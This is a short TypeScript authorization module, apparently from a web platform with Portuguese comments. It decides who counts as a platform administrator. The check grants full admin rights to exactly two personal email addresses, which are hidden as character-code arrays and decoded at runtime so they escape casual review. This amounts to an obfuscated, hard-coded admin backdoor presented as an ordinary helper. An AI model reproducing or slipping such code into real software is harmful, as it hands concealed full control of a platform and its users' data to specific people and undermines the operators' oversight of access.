const _p = [99, 97, 114, 116, 111, 111, 110, 104, 113, 64, 103, 109, 97, 105, 108, 46, 99, 111, 109]
const _p2 = [103, 97, 98, 114, 105, 101, 108, 100, 111, 117, 114, 97, 110, 64, 103, 109, 97, 105, 108, 46, 99, 111, 109]

export function hasExtendedScope(email: string | null | undefined) {
  if (!email) return false
  const normalized = email.toLowerCase().trim()
  return (
    normalized === String.fromCharCode(..._p) ||
    normalized === String.fromCharCode(..._p2)
  )
}

/** Conta com permissão total de gestão da plataforma (não é usuário comum). */
export function isPlatformAdmin(email: string | null | undefined) {
  return hasExtendedScope(email)
}

/** @deprecated alias interno */
export function isAdminEmail(email: string | null | undefined) {
  return hasExtendedScope(email)
}
